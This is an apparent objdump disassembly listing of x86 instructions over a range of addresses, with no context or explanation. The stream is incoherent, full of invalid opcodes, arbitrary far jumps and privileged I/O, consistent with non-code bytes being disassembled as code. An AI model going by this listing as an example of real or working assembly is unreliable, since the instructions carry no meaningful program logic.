  52fc58:	(bad)  [esi-0x11c41f6e]
  52fc5e:	and    BYTE PTR [ebx-0x523b3056],bl
  52fc64:	lock xchg ecx,eax
  52fc66:	sti    
  52fc67:	fadd   QWORD PTR [esi]
  52fc69:	xor    eax,DWORD PTR [esi+0x35]
  52fc6c:	lahf   
  52fc6d:	sub    eax,DWORD PTR [esi+0x7c]
  52fc70:	sbb    al,0x9e
  52fc72:	(bad)  
  52fc73:	ds push ds
  52fc75:	add    al,0x51
  52fc77:	mov    DWORD PTR [esi-0x3f],edi
  52fc7a:	call   0x1709:0xc82b3eb2
  52fc81:	pop    ebx
  52fc82:	aaa    
  52fc83:	addr16 pop esi
  52fc85:	ficomp DWORD PTR [edx-0x4cb2025c]
  52fc8b:	call   DWORD PTR [ebp-0x7e]
  52fc8e:	stos   DWORD PTR es:[edi],eax
  52fc8f:	cmp    al,bh
  52fc91:	inc    edx
  52fc92:	jg     0x52fce8
  52fc94:	xor    al,0xe5
  52fc96:	and    BYTE PTR [ecx+0x519d7834],dh
  52fc9c:	sbb    eax,0x3b34ea5e
  52fca1:	mov    DWORD PTR ds:0x3304c552,ebx
  52fca7:	add    eax,0x273b774d
  52fcac:	pop    ebp
  52fcad:	xchg   edx,eax
  52fcae:	shr    ah,0xc
  52fcb1:	call   esp
  52fcb3:	push   cs
  52fcb4:	in     al,dx
  52fcb5:	jl     0x52fcf3
  52fcb7:	mov    ds:0xf1b95806,al
  52fcbc:	push   ds
  52fcbd:	in     eax,0x57
  52fcbf:	ror    DWORD PTR [esi+0x366823bf],cl
  52fcc5:	xchg   BYTE PTR [edx-0x4b],al
  52fcc8:	dec    eax
  52fcc9:	sbb    esi,edx
  52fccb:	cmp    DWORD PTR [ecx],esi
  52fccd:	mov    ecx,0xeaeb760b
  52fcd2:	jmp    0x52fc7b
  52fcd4:	sti    
  52fcd5:	lods   al,BYTE PTR ds:[esi]
  52fcd6:	xor    bl,BYTE PTR [esi-0x47]
  52fcd9:	cmc    
  52fcda:	inc    ebp
  52fcdb:	les    ebp,FWORD PTR [edi+edi*1]
  52fcde:	and    esi,DWORD PTR [ebx+0x45]
  52fce1:	mov    ds:0x31dfc07c,eax
  52fce6:	ss lahf 
  52fce8:	xor    BYTE PTR [edi],ch
  52fcea:	xchg   edx,eax
  52fceb:	cmp    cl,cl
  52fced:	sub    esp,DWORD PTR [ebp-0x6f]
  52fcf0:	mov    BYTE PTR [esi-0x542400a6],bl
  52fcf6:	scas   eax,DWORD PTR es:[edi]
  52fcf7:	enter  0x8aa3,0xe8
  52fcfb:	mov    bl,0xbf
  52fcfd:	mov    al,ds:0x9a4f4f6b
  52fd02:	mov    dl,0x6b
  52fd04:	ins    BYTE PTR es:[edi],dx
  52fd05:	mov    edi,0x5f81a62f
  52fd0a:	and    al,0x69
  52fd0c:	mov    ebp,0x253e0706
  52fd11:	cmc    
  52fd12:	sub    BYTE PTR [edi+0x4af4cb72],ch
  52fd18:	fisub  DWORD PTR [ecx]
  52fd1a:	hlt    
  52fd1b:	mov    esi,0xeb94c450
  52fd20:	lea    esi,[ecx]
  52fd22:	inc    ebx
  52fd23:	jmp    0x9872:0x710981ad
  52fd2a:	push   esi
  52fd2b:	cmp    al,0x46
  52fd2d:	(bad)  
  52fd2e:	cmc    
  52fd2f:	push   ss
  52fd30:	lahf   
  52fd31:	ins    BYTE PTR es:[edi],dx
  52fd32:	add    al,0xcb
  52fd34:	call   0x91ab:0x68be7bb7
  52fd3b:	retf   0x80db
  52fd3e:	lods   al,BYTE PTR ds:[esi]
  52fd3f:	lods   eax,DWORD PTR ds:[esi]
  52fd40:	mov    eax,0x177c47a5
  52fd45:	jp     0x52fd4f
  52fd47:	mov    eax,ds:0xd53e5889
  52fd4c:	push   cs
  52fd4d:	inc    ebx
  52fd4e:	mov    edi,0x9ede6e2
  52fd53:	lahf   
  52fd54:	or     bl,dl
  52fd56:	add    al,0xff
  52fd58:	enter  0xda1c,0xb3
  52fd5c:	mov    cl,0x59
  52fd5e:	test   eax,0xc36431e6
  52fd63:	fldenv [ecx+0x34]
  52fd66:	dec    esi
  52fd67:	adc    DWORD PTR [ebx-0x7c],0x1b
  52fd6b:	in     al,0xa
  52fd6d:	inc    ebp
  52fd6e:	cmp    eax,edi
  52fd70:	imul   ebp,DWORD PTR [ecx-0x6a],0x9aa1f903
  52fd77:	push   ecx
  52fd78:	sbb    eax,0x6516550b
  52fd7d:	jae    0x52fdb9
  52fd7f:	cs test eax,0x5b094e5e
  52fd85:	je     0x52fdf0
  52fd87:	xchg   edi,eax
  52fd88:	or     bl,BYTE PTR [eax]
  52fd8a:	xchg   ebx,eax
  52fd8b:	xor    esi,DWORD PTR [ebx+0x39]
  52fd8e:	xchg   esi,eax
  52fd8f:	jp     0x52fe01
  52fd91:	repz push edi
  52fd93:	addr16 add eax,0x888ee971
  52fd99:	mov    cl,ah
  52fd9b:	pop    esp
  52fd9c:	adc    eax,0xa246dc94
  52fda1:	fidivr WORD PTR [edx+0x125bf508]
  52fda7:	pop    ecx
  52fda8:	sub    eax,0xb2c7fab5
  52fdad:	cmc    
  52fdae:	lds    esi,FWORD PTR [ebx]
  52fdb0:	mov    eax,ds:0x41262d4c
  52fdb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52fdb6:	dec    ecx
  52fdb7:	pop    ss
  52fdb8:	repz hlt 
  52fdba:	inc    edi
  52fdbb:	fst    DWORD PTR ds:0x7ee9f478
  52fdc1:	sub    dl,BYTE PTR [ebx-0xc]
  52fdc4:	cmp    eax,0xc0c9dffb
  52fdc9:	sahf   
  52fdca:	outs   dx,BYTE PTR ds:[esi]
  52fdcb:	clc    
  52fdcc:	int3   
  52fdcd:	and    cl,ch
  52fdcf:	inc    ebx
  52fdd0:	or     esi,DWORD PTR [ebp-0x2fc27a0e]
  52fdd6:	lds    ecx,FWORD PTR gs:[eax+eax*4-0x13]
  52fddb:	mov    dh,dh
  52fddd:	ret    0x6f9c
  52fde0:	inc    esp
  52fde1:	or     al,0x7e
  52fde3:	adc    dh,BYTE PTR [esi-0x41820a62]
  52fde9:	mov    eax,0x14cff9fb
  52fdee:	inc    esi
  52fdef:	jle    0x52fe2d
  52fdf1:	aaa    
  52fdf2:	push   ds
  52fdf3:	fimul  WORD PTR [edx-0x7cf7d917]
  52fdf9:	or     BYTE PTR [eax-0x52],bl
  52fdfc:	push   cs
  52fdfd:	lds    ebx,FWORD PTR [ebx+0x72c43ba6]
  52fe03:	ds push ebp
  52fe05:	iret   
  52fe06:	xchg   esi,eax
  52fe07:	cmp    ebx,ebx
  52fe09:	xor    eax,0xd229fa6f
  52fe0e:	pop    esp
  52fe0f:	mov    ds:0x41e28e5d,al
  52fe14:	mov    esi,0x689340b
  52fe19:	popf   
  52fe1a:	rol    al,1
  52fe1c:	cmp    DWORD PTR [edx+0x55],edi
  52fe1f:	loope  0x52fdb6
  52fe21:	out    0xd8,eax
  52fe23:	push   es
  52fe24:	adc    ecx,ebx
  52fe26:	dec    edi
  52fe27:	or     DWORD PTR [ebp-0x1857f725],edi
  52fe2d:	stc    
  52fe2e:	sar    esp,1
  52fe30:	pop    ecx
  52fe31:	ret    0x40b1
  52fe34:	fstp   TBYTE PTR [eax+eax*1-0x24]
  52fe38:	ja     0x52fe57
  52fe3a:	test   BYTE PTR [edx],0xab
  52fe3d:	leave  
  52fe3e:	jns    0x52fdce
  52fe40:	dec    ecx
  52fe41:	repnz jecxz 0x52fe97
  52fe44:	fcom   QWORD PTR [ecx-0x5f]
  52fe47:	ds jp  0x52fdfb
  52fe4a:	jae    0x52fe27
  52fe4c:	dec    edi
  52fe4d:	sub    bl,BYTE PTR [edi]
  52fe4f:	sbb    eax,0x353ad74b
  52fe54:	sti    
  52fe55:	stc    
  52fe56:	mov    edi,0x53387010
  52fe5b:	push   0x401847d9
  52fe60:	mov    ds:0x836a309e,eax
  52fe65:	mov    cl,0xc3
  52fe67:	xchg   ecx,eax
  52fe68:	xchg   ebx,eax
  52fe69:	(bad)  
  52fe6a:	cld    
  52fe6b:	shl    DWORD PTR [edx],1
  52fe6d:	or     dl,BYTE PTR [ebp-0x14]
  52fe70:	sub    eax,0x508970ed
  52fe75:	lods   al,BYTE PTR ds:[esi]
  52fe76:	jl     0x52fee9
  52fe78:	and    ah,BYTE PTR [edi]
  52fe7a:	sbb    eax,0x24c2299b
  52fe7f:	add    al,0x36
  52fe81:	jno    0x52fed7
  52fe83:	mov    dl,BYTE PTR [ebx-0x2e1db74f]
  52fe89:	jmp    0xbffb992d
  52fe8e:	push   ebx
  52fe8f:	lahf   
  52fe90:	pop    edx
  52fe91:	das    
  52fe92:	jl     0x52fe9d
  52fe94:	pushf  
  52fe95:	pop    ebx
  52fe96:	xor    DWORD PTR ds:0xd6db4d43,edx
  52fe9c:	inc    ebp
  52fe9d:	loope  0x52fe65
  52fe9f:	add    al,0x6
  52fea1:	fimul  WORD PTR [eax]
  52fea3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  52fea4:	xchg   DWORD PTR [ecx],ebp
  52fea6:	dec    ebp
  52fea7:	in     al,0x23
  52fea9:	sbb    BYTE PTR [ecx-0x43],dh
  52feac:	sbb    esi,DWORD PTR [edi+edx*2]
  52feaf:	(bad)  
  52feb0:	ja     0x52fe35
  52feb2:	jo     0x52fee7
  52feb4:	xchg   ebp,eax
  52feb5:	mov    eax,0x119d9381
  52feba:	cld    
  52febb:	sbb    BYTE PTR [esi+0x6cda09d],bl
  52fec1:	stc    
  52fec2:	mov    dl,0x7c
  52fec4:	jo     0x52fedd
  52fec6:	retf   0xca03
  52fec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  52feca:	int    0xd1
  52fecc:	adc    dl,0x1a
  52fecf:	sub    BYTE PTR [eax+ebp*2-0x14c4fe19],cl
  52fed6:	jbe    0x52ff55
  52fed8:	cli    
  52fed9:	xchg   BYTE PTR [esi+ecx*4-0x55],dh
  52fedd:	std    
  52fede:	jne    0x52ff58
  52fee0:	bound  edx,QWORD PTR [ebx-0x15e03bff]
  52fee6:	loope  0x52ff46
  52fee8:	sub    DWORD PTR [esi],0xffffff92
  52feeb:	mov    al,0xaf
  52feed:	mov    ebp,0x6ecbce58
  52fef2:	adc    al,0xc1
  52fef4:	stos   BYTE PTR es:[edi],al
  52fef5:	fdiv   QWORD PTR [esi]
  52fef7:	dec    ebp
  52fef8:	dec    ebx
  52fef9:	addr16 leave 
  52fefb:	lock jbe 0x52ff3d
  52fefe:	dec    esp
  52feff:	fs mov esi,0xc8e72c51
  52ff05:	jae    0x52ff1e
  52ff07:	loopne 0x52fed0
  52ff09:	test   ebp,ebx
  52ff0b:	(bad)  
  52ff0c:	in     eax,0xb3
  52ff0e:	jl     0x52ff83
  52ff10:	mov    ch,0x13
  52ff12:	mov    ecx,0xd8b5b889
  52ff17:	jbe    0x52ff29
  52ff19:	ss sti 
  52ff1b:	push   eax
  52ff1c:	jmp    0x7c02a7d3
  52ff21:	dec    ecx
  52ff22:	dec    esp
  52ff23:	xor    eax,0x72311cfa
  52ff28:	add    al,0x20
  52ff2a:	or     al,0x6f
  52ff2c:	ins    DWORD PTR es:[edi],dx
  52ff2d:	rcr    DWORD PTR [esi],0xf6
  52ff30:	fsubr  QWORD PTR [eax-0x6ee497a2]
  52ff36:	jge    0x52ff8e
  52ff38:	(bad)  
  52ff39:	in     eax,dx
  52ff3a:	fidiv  DWORD PTR [eax+0x3d]
  52ff3d:	push   0x1f
  52ff3f:	rcr    BYTE PTR [ecx],1
  52ff41:	in     eax,0x98
  52ff43:	leave  
  52ff44:	sbb    BYTE PTR [esi],ah
  52ff46:	test   DWORD PTR [edx],edi
  52ff48:	stos   BYTE PTR es:[edi],al
  52ff49:	pop    ebp
  52ff4a:	fidiv  WORD PTR [ebp+0x76300804]
  52ff50:	test   ebx,edi
  52ff52:	pop    ds
  52ff53:	mov    BYTE PTR [ebx],0x9c
  52ff56:	cmp    edx,DWORD PTR [eax-0x4c9e4015]
  52ff5c:	mov    ebx,0xa5e021eb
  52ff61:	js     0x52ff21
  52ff63:	dec    eax
  52ff64:	xor    dl,bh
  52ff66:	xor    dh,BYTE PTR [eax+ecx*1+0x50c7c00a]
  52ff6d:	mov    dh,0x3a
  52ff6f:	cmc    
  52ff70:	pusha  
  52ff71:	sub    BYTE PTR [esi+edi*1-0x58154c1f],0xf0
  52ff79:	lea    eax,[eax]
  52ff7b:	out    dx,al
  52ff7c:	push   0x4aa6d56d
  52ff81:	mov    ch,0xf9
  52ff83:	xor    eax,0x7116031f
  52ff88:	and    BYTE PTR [eax+0x52],0xb0
  52ff8c:	hlt    
  52ff8d:	fistp  WORD PTR [esi-0x73]
  52ff90:	imul   edx,DWORD PTR [edx-0x177a3f6],0xffffffea
  52ff97:	adc    BYTE PTR [edx],cl
  52ff99:	push   0xbd72e688
  52ff9e:	aad    0xa2
  52ffa0:	rcl    DWORD PTR [ecx],0xc4
  52ffa3:	or     al,0x54
  52ffa5:	cli    
  52ffa6:	xchg   edx,eax
  52ffa7:	sbb    ebp,DWORD PTR [ebx+ebx*4-0x6cf9119]
  52ffae:	addr16 (bad) 
  52ffb1:	(bad)  
  52ffb2:	pop    edi
  52ffb3:	gs push edx
  52ffb5:	aam    0x89
  52ffb7:	shl    DWORD PTR [ebx+ecx*4-0x62699862],0xa2
  52ffbf:	jnp    0x52ffb9
  52ffc1:	in     eax,dx
  52ffc2:	cmc    
  52ffc3:	jge    0x52ff62
  52ffc5:	cmp    dl,bl
  52ffc7:	jmp    0xd79ccf71
  52ffcc:	pop    eax
  52ffcd:	stc    
  52ffce:	and    esi,ecx
  52ffd0:	xor    edi,ebp
  52ffd2:	sti    
  52ffd3:	pop    ds
  52ffd4:	sbb    bh,BYTE PTR [eax+0x3e]
  52ffd7:	imul   ecx,DWORD PTR [ebp+0x4a569658],0xa7b54ae5
  52ffe1:	loope  0x52ff67
  52ffe3:	adc    esp,DWORD PTR ds:0x22ce9325
  52ffe9:	outs   dx,BYTE PTR ds:[esi]
  52ffea:	xchg   esi,eax
  52ffeb:	(bad)  
  52ffec:	fsubrp st(5),st
  52ffee:	mov    ecx,0xe0c8fd78
  52fff3:	and    BYTE PTR [edx-0x4a28025e],0x12
  52fffa:	sbb    edx,DWORD PTR [edi+ebx*2+0x5b]
  52fffe:	sbb    edx,esi
  530000:	push   ebx
  530001:	adc    al,BYTE PTR [edi+0x6fb388d7]
  530007:	fist   WORD PTR [esi]
  530009:	jo     0x530031
  53000b:	cdq    
  53000c:	cmp    BYTE PTR [eax],0xcc
  53000f:	pusha  
  530010:	xchg   ecx,eax
  530011:	add    al,0xed
  530013:	mov    eax,0x812ce2e
  530018:	push   ecx
  530019:	and    DWORD PTR [ebx-0x16e7ac09],eax
  53001f:	std    
  530020:	jmp    0x53009e
  530022:	sbb    al,0xef
  530024:	mov    al,0x1c
  530026:	repz rcl DWORD PTR [ebx-0x207f07b0],cl
  53002d:	call   0x1599a225
  530032:	repz std 
  530034:	adc    dl,ah
  530036:	or     BYTE PTR [ecx+0xb0f2f4c],0x2c
  53003d:	enter  0xbc44,0x6d
  530041:	sub    dh,bh
  530043:	fstp   DWORD PTR [eax+0xe56854e]
  530049:	daa    
  53004a:	pop    ebp
  53004b:	loopne 0x52ffde
  53004d:	sahf   
  53004e:	test   DWORD PTR [edx+0x5e2a2939],0xd72742df
  530058:	mov    eax,ds:0xc1750a04
  53005d:	call   0xd18a1032
  530062:	mov    ecx,0x10777d5a
  530067:	mov    fs,WORD PTR [edi+0x2d]
  53006a:	jno    0x53003d
  53006c:	loope  0x52fff2
  53006e:	xchg   esp,eax
  53006f:	sar    DWORD PTR [eax+0xd],1
  530072:	mov    cl,0xff
  530074:	pop    esi
  530075:	and    edx,ecx
  530077:	adc    bh,BYTE PTR [edx-0x367764db]
  53007d:	daa    
  53007e:	mov    ah,0xa4
  530080:	push   ss
  530081:	iret   
  530082:	lods   al,BYTE PTR ds:[esi]
  530083:	fistp  QWORD PTR [ebx-0x59]
  530086:	and    esp,edx
  530088:	(bad)  
  530089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  53008a:	enter  0xc6e7,0x18
  53008e:	pusha  
  53008f:	stos   BYTE PTR es:[edi],al
  530090:	xor    bl,dh
  530092:	xor    eax,0x29b6bd
  530097:	outs   dx,DWORD PTR ds:[esi]
  530098:	repz ja 0x5300b3
  53009b:	lods   eax,DWORD PTR ds:[esi]
  53009c:	add    BYTE PTR cs:[eax+0x14c85aaa],0x2
  5300a4:	and    al,0x61
  5300a7:	pop    edi
  5300a8:	rcl    BYTE PTR [ebx-0x7c5418c4],1
  5300ae:	outs   dx,DWORD PTR ds:[esi]
  5300af:	rol    BYTE PTR [eax+0x1d81153f],cl
  5300b5:	mov    al,ds:0x1fe81e62
  5300ba:	stos   DWORD PTR es:[edi],eax
  5300bb:	ret    0x20ce
  5300be:	jo     0x530102
  5300c0:	or     al,0x73
  5300c2:	mov    bh,dh
  5300c4:	inc    eax
  5300c5:	pop    eax
  5300c6:	dec    edi
  5300c7:	aam    0x72
  5300c9:	in     eax,0x77
  5300cb:	jae    0x5300e5
  5300cd:	cmp    eax,0x257a6463
  5300d2:	and    al,0x8e
  5300d4:	pop    ebx
  5300d5:	add    cl,BYTE PTR [edi+0x29]
  5300d8:	sub    al,0x98
  5300da:	sar    BYTE PTR [eax+0x571bedf7],0x13
  5300e1:	(bad)  
  5300e2:	out    0x2a,eax
  5300e4:	push   ds
  5300e5:	or     ebp,esp
  5300e7:	mul    BYTE PTR [esi+ebx*8+0x27e40dc8]
  5300ee:	jb     0x53009f
  5300f0:	push   edi
  5300f1:	and    al,0x25
  5300f3:	inc    ecx
  5300f4:	aaa    
  5300f5:	push   es
  5300f6:	mov    ebp,0x9148b2bc
  5300fb:	int3   
  5300fc:	cmp    al,0xea
  5300fe:	test   esp,ebp
  530100:	aaa    
  530101:	inc    ebp
  530102:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  530103:	cli    
  530104:	in     eax,dx
  530105:	jle    0x5300f0
  530107:	add    ch,BYTE PTR [eax]
  530109:	inc    esp
  53010a:	scas   eax,DWORD PTR es:[edi]
  53010b:	aas    
  53010c:	inc    ecx
  53010d:	cmp    al,0x79
  53010f:	jno    0x5300e0
  530111:	xor    eax,0xf026b984
  530116:	in     al,0xfb
  530118:	xchg   esi,eax
  530119:	sub    BYTE PTR [ebx],al
  53011b:	and    eax,0x57bb2e1d
  530120:	das    
  530121:	mov    cl,0xad
  530123:	adc    al,0xbc
  530125:	or     al,al
  530127:	aaa    
  530128:	pop    esp
  530129:	sbb    edi,ebp
  53012b:	icebp  
  53012c:	je     0x5300cc
  53012e:	mov    edi,0x662b167a
  530133:	mov    gs,esi
  530135:	mov    esp,0xe959a89
  53013a:	adc    esp,esi
  53013c:	in     eax,dx
  53013d:	shl    BYTE PTR [ecx],0x0
  530140:	in     eax,dx
  530141:	push   eax
  530142:	stos   BYTE PTR es:[edi],al
  530143:	cmc    
  530144:	push   edx
  530145:	sub    ecx,edi
  530147:	xor    esi,DWORD PTR [ebx+0x50]
  53014a:	gs ja  0x5300d4
  53014d:	mov    eax,ds:0x44f1d13c
  530152:	push   eax
  530153:	or     ebx,DWORD PTR [ecx]
  530155:	jl     0x5301c0
  530157:	cli    
  530158:	mov    edi,0x2e5bd8cb
  53015d:	arpl   WORD PTR [edx-0x7],si
  530160:	inc    esi
  530161:	mov    fs,WORD PTR [edi]
  530163:	cmp    al,0xf7
  530165:	aaa    
  530166:	push   ds
  530167:	(bad)  
  530169:	mov    ebx,0x49f3f1d7
  53016e:	jmp    0x22f4:0xa073fe57
  530175:	adc    ebx,DWORD PTR ds:0x9a86c178
  53017b:	jns    0x53015f
  53017d:	mov    edi,0x97468348
  530182:	retf   0xb013
  530185:	aam    0x2
  530187:	inc    esi
  530188:	repz std 
  53018a:	addr16 sbb dh,bl
  53018d:	sbb    eax,0x2fbb3e7b
  530192:	loopne 0x530185
  530194:	adc    DWORD PTR [edx-0x315433fe],esi
  53019a:	dec    esp
  53019b:	test   eax,0x51fc3612
  5301a0:	pop    ebx
  5301a1:	jle    0x5301c9
  5301a3:	in     eax,0xe3
  5301a5:	push   esp
  5301a6:	popa   
  5301a7:	retf   0x5076
  5301aa:	jns    0x530223
  5301ac:	mov    ah,0x40
  5301ae:	retf   
  5301af:	gs mov dl,0xab
  5301b2:	jne    0x530193
  5301b4:	fistp  WORD PTR [ebx+0x19]
  5301b7:	mov    dh,0x16
  5301b9:	shl    DWORD PTR [esi],0x97
  5301bc:	cs push esp
  5301be:	push   esi
  5301bf:	pop    es
  5301c0:	popf   
  5301c1:	or     eax,0xa8834a0d
  5301c6:	push   ds
  5301c7:	pop    ebp
  5301c8:	pop    ss
  5301c9:	push   ebx
  5301ca:	(bad)  
  5301cb:	jmp    0x530180
  5301cd:	xchg   esi,eax
  5301ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5301cf:	xor    ecx,ebx
  5301d1:	jo     0x5301a7
  5301d3:	in     al,dx
  5301d4:	add    edi,ebx
  5301d6:	(bad)  
  5301d7:	rol    BYTE PTR [esi+ecx*2+0x4c70e054],1
  5301de:	into   
  5301df:	pop    ecx
  5301e0:	loopne 0x530178
  5301e2:	into   
  5301e3:	inc    ecx
  5301e4:	call   0x7fd573a5
  5301e9:	and    ecx,DWORD PTR cs:[ebp+0x202feb9f]
  5301f0:	pop    ss
  5301f1:	ret    
  5301f2:	and    eax,esi
  5301f4:	adc    eax,0x9c8d1d86
  5301f9:	popa   
  5301fa:	aaa    
  5301fb:	adc    eax,0x68045dae
  530200:	int3   
  530201:	mov    eax,ds:0x70a7f04e
  530206:	lods   eax,DWORD PTR ds:[esi]
  530207:	nop
  530208:	xchg   edi,eax
  530209:	push   esp
  53020a:	jno    0x530209
  53020c:	(bad)  
  53020d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  53020e:	repnz mov ebx,0x456daaac
  530214:	add    BYTE PTR [ebp+0x2c4c9627],cl
  53021a:	stc    
  53021b:	mov    ebp,0x7f749a74
  530220:	mov    ds:0xbbed1a83,eax
  530225:	xchg   DWORD PTR [ecx-0x42c87459],edi
  53022b:	jle    0x530281
  53022d:	pop    edi
  53022e:	push   0x74
  530230:	push   edx
  530231:	fdecstp 
  530233:	shr    BYTE PTR [edx],cl
  530235:	dec    ebx
  530236:	imul   edx,edx,0x40a106f3
  53023c:	and    BYTE PTR [edi],0xfe
  53023f:	das    
  530240:	shr    ebp,cl
  530242:	lahf   
  530243:	dec    ecx
  530244:	lahf   
  530245:	mov    esi,0xab05d9e2
  53024a:	push   esi
  53024b:	ss sbb al,0xf5
  53024e:	mov    esi,0x3019b722
  530253:	fst    DWORD PTR [ecx]
  530255:	mov    esp,0x5c281564
  53025a:	mov    ch,0x82
  53025c:	lea    edi,[edx-0x3b8ec3a2]
  530262:	mov    dh,0x89
  530264:	pop    ss
  530265:	icebp  
  530266:	cmp    DWORD PTR [edx-0x75],esp
  530269:	pop    esp
  53026a:	cli    
  53026b:	dec    ebp
  53026c:	arpl   WORD PTR [ecx-0x6743c1ae],bx
  530272:	call   DWORD PTR [edx-0x1e489916]
  530278:	xchg   ebp,eax
  530279:	jmp    0x530269
  53027b:	xor    esp,DWORD PTR [eax]
  53027d:	jae    0x53021b
  53027f:	das    
  530280:	pop    ecx
  530281:	dec    ebx
  530282:	mov    ebx,0x92e39ccb
  530288:	cld    
  530289:	paddb  mm4,QWORD PTR [esi]
  53028c:	pop    eax
  53028d:	mov    ebx,0xd59ccccc
  530292:	test   DWORD PTR [ebx],edx
  530294:	fldlg2 
  530296:	sub    DWORD PTR ss:[esi-0x46],ebp
  53029a:	push   esp
  53029b:	xor    al,0xcb
  53029d:	pop    ebp
  53029e:	scas   eax,DWORD PTR es:[edi]
  53029f:	jp     0x53027d
  5302a1:	clc    
  5302a2:	sbb    al,0x47
  5302a4:	not    DWORD PTR [eiz*1-0x2e2f4da]
  5302ab:	out    0x19,eax
  5302ad:	cmp    edi,ecx
  5302af:	mov    ah,0xe5
  5302b1:	in     al,dx
  5302b2:	push   0x354c8f32
  5302b7:	adc    eax,0x34558861
  5302bc:	adc    al,0xac
  5302be:	xor    DWORD PTR [esi],ebx
  5302c0:	ss sti 
  5302c2:	lock inc esi
  5302c4:	cmp    ch,BYTE PTR [eax+edi*4-0x51]
  5302c8:	xor    edi,DWORD PTR [eax-0x1003fe77]
  5302ce:	sub    eax,0xd7d5e8de
  5302d3:	pop    es
  5302d4:	dec    ecx
  5302d5:	pop    ss
  5302d6:	add    eax,0x393e4662
  5302db:	jne    0x530330
  5302dd:	jmp    0xc057:0x7b31f718
  5302e4:	shl    dh,1
  5302e6:	hlt    
  5302e7:	pop    eax
  5302e8:	pop    esp
  5302e9:	call   0xb515:0x4f7ce8b1
  5302f0:	jmp    0xba68914e
  5302f5:	movhps QWORD PTR [ebp+0x10],xmm3
  5302f9:	or     edx,DWORD PTR [edi-0x27]
  5302fc:	jg     0x5302ea
  5302fe:	sub    dl,BYTE PTR [ebp+0x43]
  530301:	pop    ss
  530302:	cmc    
  530303:	lahf   
  530304:	call   0xd4cb7135
  530309:	ret    0x899e
  53030c:	or     al,0x29
  53030e:	mov    ebx,DWORD PTR [ecx-0x59]
  530311:	(bad)  
  530312:	call   0x2fc5:0x6f6eee8a
  530319:	loope  0x5302bb
  53031b:	in     al,dx
  53031c:	lods   eax,DWORD PTR ds:[esi]
  53031d:	fisub  WORD PTR [edx+0x4b]
  530320:	mov    al,ds:0x816a1abd
  530325:	jmp    0x1754:0xcdbde4f7
  53032c:	mov    al,ds:0x8e7adf57
  530331:	loope  0x5302f2
  530333:	jmp    0x89c8:0x2c874e9d
  53033a:	imul   eax,esp,0xa9d5a104
  530340:	inc    esi
  530341:	(bad)  
  530343:	shr    DWORD PTR [ecx],1
  530345:	inc    ecx
  530346:	into   
  530347:	dec    edi
  530348:	mov    ds:0xad854a1f,eax
  53034d:	es das 
  53034f:	jnp    0x5303ce
  530351:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  530352:	int3   
  530353:	leave  
  530354:	xchg   ebx,eax
  530355:	adc    edi,DWORD PTR [edi+0x65ba0ccc]
  53035b:	cmp    al,0xf2
  53035d:	mov    al,ds:0xb8bbc83e
  530362:	cwde   
  530363:	add    dh,BYTE PTR [ebp-0x15e8029c]
  530369:	pop    edi
  53036a:	mov    bl,0x89
  53036c:	mov    ah,0x59
  53036e:	xor    ecx,DWORD PTR ds:[ebx+0x1e]
  530372:	sub    ebp,0xbb04ad46
  530378:	sar    DWORD PTR [edi+eax*1],cl
  53037b:	mov    edi,edi
  53037d:	mov    fs,WORD PTR [ebx+0x22]
  530380:	adc    eax,0x64f2b18b
  530385:	aad    0x33
  530387:	mov    dh,0xf6
  530389:	sub    BYTE PTR [edx+0x5],ah
  53038c:	ins    DWORD PTR es:[edi],dx
  53038d:	sub    BYTE PTR [esi+0x2b],cl
  530390:	sbb    DWORD PTR [eax+0x11],ecx
  530393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  530394:	sub    DWORD PTR [edx+0x76],0x13321e4f
  53039b:	(bad)  
  53039c:	ins    BYTE PTR es:[edi],dx
  53039d:	les    ebx,FWORD PTR [eax-0x123cdfa9]
  5303a3:	(bad)  
  5303a4:	(bad)  
  5303a5:	jo     0x530380
  5303a7:	ja     0x530363
  5303a9:	test   DWORD PTR [esi],esp
  5303ab:	pop    ebp
  5303ac:	(bad)  
  5303ad:	daa    
  5303ae:	jmp    0x53035b
  5303b0:	(bad)  
  5303b1:	sar    BYTE PTR [edi-0x61],1
  5303b4:	jmp    0x53042f
  5303b6:	jl     0x530396
  5303b8:	push   esp
  5303b9:	int    0xb5
  5303bb:	add    BYTE PTR [edx-0x2859b4ed],ah
  5303c1:	cmp    eax,0xa7d31cde
  5303c6:	dec    esi
  5303c7:	dec    edi
  5303c8:	sub    cl,bh
  5303ca:	test   BYTE PTR [edi+edi*1+0x7a0c8e19],0x2c
  5303d2:	repnz mov ds:0x8cead72b,eax
  5303d8:	inc    edx
  5303d9:	repnz pop ebp
  5303db:	xor    BYTE PTR [esi-0x222a052f],dh
  5303e1:	sub    al,0x15
  5303e3:	pop    es
  5303e4:	sar    DWORD PTR [edi-0x7b7b9f67],cl
  5303ea:	sti    
  5303eb:	mov    dh,0x3a
  5303ed:	pop    edx
  5303ee:	out    0xbd,al
  5303f0:	inc    edx
  5303f1:	lock adc BYTE PTR [ebx-0x3b7abb6],dl
  5303f8:	cwde   
  5303f9:	jns    0x5303a1
  5303fb:	jnp    0x5303b6
  5303fd:	aam    0xc8
  5303ff:	js     0x5303e6
  530401:	pop    ebp
  530402:	(bad)  
  530403:	in     eax,dx
  530404:	mov    edi,0x6b7995eb
  530409:	pushf  
  53040a:	test   BYTE PTR [ecx+0xcf288b6],dh
  530410:	leave  
  530411:	jmp    0x5303fc
  530413:	mov    ah,ch
  530415:	out    dx,al
  530416:	(bad)  
  530417:	mov    esi,0x997cc2b2
  53041c:	sub    DWORD PTR [eax+0x4c],0xbdac15e4
  530423:	sub    BYTE PTR [esi-0x4cdfef7c],cl
  530429:	cmp    BYTE PTR [ebx+0x480388b3],cl
  53042f:	imul   al
  530431:	fs pop ds
  530433:	mul    DWORD PTR [edi+0x4523f8a0]
  530439:	ds inc edx
  53043b:	clc    
  53043c:	push   ecx
  53043d:	sub    BYTE PTR ds:0x96a624e3,cl
  530443:	mov    WORD PTR [esi+0x18b514ac],ds
  530449:	shl    al,cl
  53044b:	and    dl,BYTE PTR [eax+0x68ca39b2]
